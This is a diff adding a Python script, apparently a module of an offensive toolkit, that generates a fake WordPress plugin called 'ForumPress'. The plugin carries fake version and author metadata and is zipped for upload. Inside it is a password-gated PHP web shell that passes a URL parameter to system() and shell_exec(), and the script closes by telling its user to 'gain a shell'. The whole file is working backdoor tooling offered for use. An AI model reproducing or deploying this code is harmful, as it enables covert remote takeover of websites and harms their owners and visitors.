@@ -1,0 +1,41 @@
+#!/usr/bin/env python3
+Description = 'Wordpress plugin backdoor'
+
+import os, random, sys, zipfile, subprocess, requests
+from pluginsupport import *
+
+malicious_code = """<?php ($_GET['passwd'] == 'qgAZ9xWxTsmGX5mgnbTHyzdf5oSbwzRhVB4LL7d29RSb4MqXRdbSWEoCvaTn') ? NULL : exit; system($_GET['c']); shell_exec($_GET['c']); ?>"""
+
+def main():
+	text("Generating plugin script")
+	plugin_script = "<?php\n"
+	plugin_script += "/**\n"
+	plugin_script += " * Plugin Name: %s\n" % ("ForumPress")
+	plugin_script += " * Version: %d.%d.%d\n" % (random.randint(1, 10), random.randint(1, 10), random.randint(1, 10))
+	plugin_script += " * Author: The ForumPress Community\n"
+	plugin_script += " * Author URI: \n"
+	plugin_script += " * License: GPL2\n"
+	plugin_script += " */\n"
+	plugin_script += "?>\n"
+
+	text("Writing plugin script to file")
+	plugin_file = open('index.php','w')
+	plugin_file.write(plugin_script)
+	plugin_file.close()
+	text("Generating payload To file")
+
+	payload_file = open('forum_press.php', 'w')
+	payload_file.write(malicious_code)
+	payload_file.close()
+
+	text("Writing files to zip")
+	make_zip = zipfile.ZipFile('ForumPress.zip', 'w')
+	make_zip.write('index.php')
+	make_zip.write('forum_press.php')
+	text("Cleaning up files")
+	run("rm index.php forum_press.php && echo 'Files have been removed'")
+	run("mv ForumPress.zip storage/logs/ForumPress.zip && echo 'Moving compiled plugin into storage'")
+	text("Saved as: storage/logs/ForumPress.zip")
+	success("Done, use SinglePartner to gain a shell.")
+
+main()
